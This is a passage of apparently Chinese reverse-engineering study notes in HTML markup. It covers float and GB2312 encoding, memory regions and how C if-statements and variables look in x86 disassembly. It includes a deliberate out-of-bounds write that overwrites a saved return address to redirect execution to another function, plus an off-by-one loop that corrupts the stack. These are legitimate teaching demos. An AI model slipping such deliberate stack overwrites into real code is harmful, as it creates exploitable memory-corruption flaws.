)</span><br><span class=\"line\">\t10000010</span><br><span class=\"line\">6.拼接</span><br><span class=\"line\">\t01000001000001000000000000000000</span><br><span class=\"line\">\t41040000</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0.25</span><br><span class=\"line\"></span><br><span class=\"line\">0.01   -&gt; 1.0</span><br><span class=\"line\">1 * (2^(-2))  右移</span><br><span class=\"line\">FD = -2-1 = -3</span><br><span class=\"line\"></span><br><span class=\"line\">0</span><br><span class=\"line\">0 1111101</span><br><span class=\"line\">00000000000000000000000</span><br><span class=\"line\"></span><br><span class=\"line\">00111110100000000000000000000000</span><br><span class=\"line\"></span><br><span class=\"line\">3E800000</span><br></pre></td></tr></table></figure>\n<p>尾数部分长度决定精确度，比如 8.4 的小数部分无限循环</p>\n<p>比如 float 精确到 24 位 (尾数 + 科学计数法最前面的 0 或 1)，可以精确到小数点后 6 位</p>\n<h3 id=\"编码\"><a class=\"markdownIt-Anchor\" href=\"#编码\">#</a> 编码</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过两个ASCII表示一个汉字，即为GB2312</span><br><span class=\"line\"></span><br><span class=\"line\">一个小于127的字符的意义与原来相同，但两个大于127的字符连在一起时，就表示一个汉字，前面的一个字节(他称之为高字节）从0xA1用至0xF7，后面一个字(低字节)从0xA1到0xFE，这样我们就可以组合出大约7000多个简体汉字了。</span><br><span class=\"line\"></span><br><span class=\"line\">一个char占一个字节，放不下gb2312</span><br><span class=\"line\">gb2312每个字节最高位都是1 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>if</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if-else  /  if - if else else </span><br><span class=\"line\">只会执行其中一种分支</span><br></pre></td></tr></table></figure>\n<h3 id=\"程序内存\"><a class=\"markdownIt-Anchor\" href=\"#程序内存\">#</a> 程序内存</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">代码区  可读可执行</span><br><span class=\"line\"></span><br><span class=\"line\">堆栈   参数，局部变量，临时数据</span><br><span class=\"line\"></span><br><span class=\"line\">堆    动态申请，大小可变，可读可写</span><br><span class=\"line\"></span><br><span class=\"line\">全局变量   可读可写,程序运行时分配</span><br><span class=\"line\"></span><br><span class=\"line\">常量区    只读</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>全局变量的特点:<br>\n1、全局变量在程序编译完成后地址就已经确定下来了，只要程序启动，全局变量就已经存是否有值取决于声明时是否给定了初始值，如果没有，默认为 0</p>\n<p>2、全局变量的值可以被所有函数所修改，里面存储的是最后一次修改的值.</p>\n<p>3、全局变量所占内存会一直存在，知道整个进程结束.</p>\n<p>4、全局变量的反汇编识别:</p>\n<p>MOV 寄存器，byte/word/dword ptr ds: [0x12345678]</p>\n<p>通过寄存器的宽度，或者 byte/word/dword 来判断全局变量的宽度</p>\n<p>全局变量就是基址</p>\n<p>局部变量的特点</p>\n<p>1、局部变量在程序编译完成后并没有分配固定的地址.</p>\n<p>2、在所属的方法没有被调用时，局部变量并不会分配内存地址，只有调用时才在堆栈中分配内存.</p>\n<p>3、当局部变量所属的方法执行先毕后，局部变量所占用的内存将变成垃圾</p>\n<p>4、局部变量只能在方法内部使用，函数 A 无法使用函数 B 的局部变量.</p>\n<p>5、局部变量的反汇编识别:</p>\n<p>判断参数个数</p>\n<p>观察调用处的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 3</span><br><span class=\"line\">call </span><br></pre></td></tr></table></figure>\n<p>找到堆栈平衡的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call</span><br><span class=\"line\">add esp,0C</span><br><span class=\"line\"></span><br><span class=\"line\">或者函数内部</span><br><span class=\"line\">ret 0xC</span><br></pre></td></tr></table></figure>\n<p>1、不考虑 ebp、 esp</p>\n<p>2、只找给别人赋值的寄存器 eax/ecx/edx/ebx/esi/edi</p>\n<p>3、找到以后追查其来源，如果，该寄存器中的值不是在函数内存赋值的，那一定是传进来的参数.</p>\n<p>公式一：寄存器 + ret4 = 参数个数</p>\n<p>公式二：寄存器＋[ebp+8] +[ebp+0x] = 参数个数</p>\n<h3 id=\"if语句\"><a class=\"markdownIt-Anchor\" href=\"#if语句\">#</a> if 语句</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int g_n = 10;</span><br><span class=\"line\">void func(int x, int y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (x&gt;y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tg_n = x;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr [ebp+8]</span><br><span class=\"line\">cmp eax,dword ptr [ebp+0x0C]</span><br><span class=\"line\">jle func+29h(401049)</span><br><span class=\"line\">mov ecx,dword ptr [ebp+8]</span><br><span class=\"line\">mov dword ptr [424a30],ecx</span><br><span class=\"line\">pop edi   401049</span><br></pre></td></tr></table></figure>\n<p>在反汇编中 jcc 的代码和 if 中的判断条件是相反的</p>\n<p>还原反汇编</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230110133105437.png\" alt=\"image-20230110133105437\"></p>\n<p>函数内部功能分析:</p>\n<p>1、分析参数:[ebp+8] : x   [ebp+0Ch] :Y</p>\n<p>2、分析局部变量</p>\n<p>3、分析全局变量<br>\n mov dword ptr 004225c4,ecx</p>\n<p>4、功能分析<br>\n eax, dword ptr [ebp+8]<br>\ncmp eax, dword ptr [ebp+0Ch]</p>\n<p>将参数 x 存到到 EAX 中，然后比较 EAX。与参数 Y 的大小如果 x&lt;=Y 那么跳转到 00401059 的位置</p>\n<p>否则，将 X 的值存储到全局变量中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int a</span><br><span class=\"line\">int func(int x, int y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint var1 = a;</span><br><span class=\"line\">\tif(x&lt;=y)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ty = var1 + y;</span><br><span class=\"line\">        a = y;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tret a</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>if 会有影响寄存器的语句，然后 JCC</p>\n<p>if-else 中会有向下跳的 jmp，通过 jmp 跳过 else 之后的代码</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230110141055410.png\" alt=\"image-20230110141055410\"></p>\n<p>1、当每个条件跳转指令要跳转的地址前面都有 jmp 指令</p>\n<p>2、这些 jmp 指令跳转的地址都是一样的</p>\n<p>3、如果某个分支没有条件判断，则为 else 部分中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">void HelloWorld()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;helloworld&quot;);</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint arr[5] = &#123;1,2,3,4,5&#125;;</span><br><span class=\"line\">\tarr[6] = (int)HelloWorld;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004010C0 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">004010C1  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">004010C3  |.  83EC 54       sub     esp,0x54</span><br><span class=\"line\">004010C6  |.  53            push    ebx</span><br><span class=\"line\">004010C7  |.  56            push    esi</span><br><span class=\"line\">004010C8  |.  57            push    edi</span><br><span class=\"line\">004010C9  |.  8D7D AC       lea     edi,[local.21]</span><br><span class=\"line\">004010CC  |.  B9 15000000   mov     ecx,0x15</span><br><span class=\"line\">004010D1  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">004010D6  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">004010D8  |.  C745 EC 01000&gt;mov     dword ptr ss:[ebp-0x14],0x1</span><br><span class=\"line\">004010DF  |.  C745 F0 02000&gt;mov     [local.4],0x2</span><br><span class=\"line\">004010E6  |.  C745 F4 03000&gt;mov     [local.3],0x3</span><br><span class=\"line\">004010ED  |.  C745 F8 04000&gt;mov     [local.2],0x4</span><br><span class=\"line\">004010F4  |.  C745 FC 05000&gt;mov     dword ptr ss:[ebp-0x4],0x5</span><br><span class=\"line\">004010FB  |.  C745 04 05104&gt;mov     dword ptr ss:[ebp+0x4],00401005</span><br><span class=\"line\">00401102  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401104  |.  5F            pop     edi</span><br><span class=\"line\">00401105  |.  5E            pop     esi</span><br><span class=\"line\">00401106  |.  5B            pop     ebx</span><br><span class=\"line\">00401107  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00401109  |.  5D            pop     ebp</span><br><span class=\"line\">0040110A  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0018FF28   CCCCCCCC</span><br><span class=\"line\">0018FF2C   CCCCCCCC</span><br><span class=\"line\">0018FF30   CCCCCCCC</span><br><span class=\"line\">0018FF34   CCCCCCCC</span><br><span class=\"line\">0018FF38   CCCCCCCC</span><br><span class=\"line\">0018FF3C   CCCCCCCC</span><br><span class=\"line\">0018FF40   CCCCCCCC</span><br><span class=\"line\">0018FF44   CCCCCCCC</span><br><span class=\"line\">0018FF48  /0018FF88  ebp</span><br><span class=\"line\">0018FF4C  |004015F9  返回到 88888.&lt;ModuleEntryPoint&gt;+0E9 来自 88888.0040100A</span><br><span class=\"line\"></span><br><span class=\"line\">0018FF28   CCCCCCCC</span><br><span class=\"line\">0018FF2C   CCCCCCCC</span><br><span class=\"line\">0018FF30   CCCCCCCC</span><br><span class=\"line\">0018FF34   00000001</span><br><span class=\"line\">0018FF38   00000002</span><br><span class=\"line\">0018FF3C   00000003</span><br><span class=\"line\">0018FF40   00000004</span><br><span class=\"line\">0018FF44   00000005</span><br><span class=\"line\">0018FF48   0018FF88  ebp</span><br><span class=\"line\">0018FF4C   00401005  88888.00401005</span><br><span class=\"line\"></span><br><span class=\"line\">00401005   . /E9 16000000   jmp     HelloWorld</span><br><span class=\"line\">0040100A   $ |E9 B1000000   jmp     main</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">void Func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i;</span><br><span class=\"line\">\tint arr[5] = &#123;0&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfor(i=0;i&lt;=5;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tarr[i]=0;</span><br><span class=\"line\">\t\tprintf(&quot;hello world&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFunc();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004010C0 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">004010C1  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">004010C3  |.  83EC 40       sub     esp,0x40</span><br><span class=\"line\">004010C6  |.  53            push    ebx</span><br><span class=\"line\">004010C7  |.  56            push    esi</span><br><span class=\"line\">004010C8  |.  57            push    edi</span><br><span class=\"line\">004010C9  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">004010CC  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">004010D1  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">004010D6  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">004010D8  |.  E8 32FFFFFF   call    0040100F</span><br><span class=\"line\">004010DD  |.  33C0          xor     eax,eax</span><br><span class=\"line\">004010DF  |.  5F            pop     edi</span><br><span class=\"line\">004010E0  |.  5E            pop     esi</span><br><span class=\"line\">004010E1  |.  5B            pop     ebx</span><br><span class=\"line\">004010E2  |.  83C4 40       add     esp,0x40</span><br><span class=\"line\">004010E5  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">004010E7  |.  E8 E4030000   call    _chkesp</span><br><span class=\"line\">004010EC  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">004010EE  |.  5D            pop     ebp</span><br><span class=\"line\">004010EF  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">00401005   . /E9 16000000   jmp     Func</span><br><span class=\"line\">0040100A   $ |E9 B1000000   jmp     main</span><br><span class=\"line\">0040100F  /$ |E9 0C000000   jmp     Func</span><br><span class=\"line\"></span><br><span class=\"line\">00401020 &gt;|&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 58       sub     esp,0x58</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br><span class=\"line\">00401029  |.  8D7D A8       lea     edi,[local.22]</span><br><span class=\"line\">0040102C  |.  B9 16000000   mov     ecx,0x16</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  C745 E8 00000&gt;mov     [local.6],0x0</span><br><span class=\"line\">0040103F  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401041  |.  8945 EC       mov     [local.5],eax</span><br><span class=\"line\">00401044  |.  8945 F0       mov     [local.4],eax</span><br><span class=\"line\">00401047  |.  8945 F4       mov     [local.3],eax</span><br><span class=\"line\">0040104A  |.  8945 F8       mov     [local.2],eax</span><br><span class=\"line\">0040104D  |.  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">00401054  |.  EB 09         jmp     short 0040105F</span><br><span class=\"line\">00401056  |&gt;  8B4D FC       /mov     ecx,[local.1]</span><br><span class=\"line\">00401059  |.  83C1 01       |add     ecx,0x1</span><br><span class=\"line\">0040105C  |.  894D FC       |mov     [local.1],ecx</span><br><span class=\"line\">0040105F  |&gt;  837D FC 05     cmp     [local.1],0x5</span><br><span class=\"line\">00401063  |.  7F 1A         |jg      short 0040107F</span><br><span class=\"line\">00401065  |.  8B55 FC       |mov     edx,[local.1]</span><br><span class=\"line\">00401068  |.  C74495 E8 000&gt;|mov     dword ptr ss:[ebp+edx*4-0x18],0&gt;</span><br><span class=\"line\">00401070  |.  68 1C304200   |push    0042301C                        ; /format = &quot;hello world&quot;</span><br><span class=\"line\">00401075  |.  E8 D6030000   |call    printf                          ; \\printf</span><br><span class=\"line\">0040107A  |.  83C4 04       |add     esp,0x4</span><br><span class=\"line\">0040107D  |.^ EB D7         \\jmp     short 00401056</span><br><span class=\"line\">0040107F  |&gt;  5F            pop     edi</span><br><span class=\"line\">00401080  |.  5E            pop     esi</span><br><span class=\"line\">00401081  |.  5B            pop     ebx</span><br><span class=\"line\">00401082  |.  83C4 58       add     esp,0x58</span><br><span class=\"line\">00401085  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">00401087  |.  E8 44040000   call    _chkesp</span><br><span class=\"line\">0040108C  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040108E  |.  5D            pop     ebp</span><br><span class=\"line\">0040108F  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">mov     dword ptr ss:[ebp+edx*4-0x18],0 在最后一次循环将ebp-4 = i变为了0，循环条件永远满足</span><br></pre></td></tr></table></figure>\n<p>总结:</p>\n<p>声明变量就是告诉计算机，我要用一块内存，你给我留着，宽度和存储格式有数据类型决定.</p>\n<p>计算机什么时候把这块内存给你，取决于变量的作用范围，如果是全局变量，在程序编译完就已经分配了空间，如果是局所在的程序被调用的时候，才会分配空间.</p>\n<p>全局变量如果不赋初始值，默认是 0，但局部变量在使用前一定要赋初值.</p>\n<p>类型转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movsx   ;先符号扩展再传送</span><br><span class=\"line\">mov al,0x0FF     </span><br><span class=\"line\">movsx cx,al      11111111 11111111 </span><br><span class=\"line\">movsx al,80</span><br><span class=\"line\">movsx cx,al</span><br><span class=\"line\"></span><br><span class=\"line\">movzx</span><br><span class=\"line\">mov al,0x0ff</span><br><span class=\"line\">movzx cx,al</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int -&gt; short 转换时高位丢失，即从低位开始截取</span><br><span class=\"line\">int a = 0x12345678;</span><br><span class=\"line\">short b = a;     b = 5678</span><br></pre></td></tr></table></figure>\n<p>表达式</p>\n<p>特点一:</p>\n<p>表达式无论多么复杂，都只有一个结果</p>\n<p>特点二:</p>\n<p>只有表达式，可以编译通过，但并不生成代码，需要与赋值或者其他流程控制语句一起组合的时候才有意义</p>\n<p>特点三:</p>\n<p>当表达式中存在不同宽度的变量时，结果将转换为宽度最大的那个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char a = 10;</span><br><span class=\"line\">int b = 20;</span><br><span class=\"line\">printf(&quot;%d&quot;,a+b);   ;a+b为int类型</span><br></pre></td></tr></table></figure>\n<p>特点四:</p>\n<p>当表达式中同时存在有符号和无符号数的时候，表达式的结构将转换为无符号数.</p>\n<p>输出无符号或有符号根据输出的格式 % d 或 % u 决定</p>\n<p>int x = a == b;    ;sete  setne</p>\n<p>sete cmp 相等时 set 寄存器为 1</p>\n<p>if(a) == if(a != 0)</p>\n<p>if(!a) == if(a == 0)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (x&gt;1 &amp;&amp; x&gt;2 &amp;&amp; x&gt;3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;sb&quot;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if (x&gt;1 || x&gt;2 || x&gt;3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;sb&quot;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00401020 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 44       sub     esp,0x44</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br><span class=\"line\">00401029  |.  8D7D BC       lea     edi,[local.17]</span><br><span class=\"line\">0040102C  |.  B9 11000000   mov     ecx,0x11</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  C745 FC 05000&gt;mov     [local.1],0x5</span><br><span class=\"line\">0040103F  |.  837D FC 01    cmp     [local.1],0x1</span><br><span class=\"line\">00401043  |.  7E 19         jle     short 0040105E</span><br><span class=\"line\">00401045  |.  837D FC 02    cmp     [local.1],0x2</span><br><span class=\"line\">00401049  |.  7E 13         jle     short 0040105E</span><br><span class=\"line\">0040104B  |.  837D FC 03    cmp     [local.1],0x3</span><br><span class=\"line\">0040104F  |.  7E 0D         jle     short 0040105E</span><br><span class=\"line\">00401051  |.  68 1C304200   push    0042301C                         ; /format = &quot;sb&quot;</span><br><span class=\"line\">00401056  |.  E8 F5030000   call    printf                           ; \\printf</span><br><span class=\"line\">0040105B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0040105E  |&gt;  837D FC 01    cmp     [local.1],0x1</span><br><span class=\"line\">00401062  |.  7F 0C         jg      short 00401070</span><br><span class=\"line\">00401064  |.  837D FC 02    cmp     [local.1],0x2</span><br><span class=\"line\">00401068  |.  7F 06         jg      short 00401070</span><br><span class=\"line\">0040106A  |.  837D FC 03    cmp     [local.1],0x3</span><br><span class=\"line\">0040106E  |.  7E 0D         jle     short 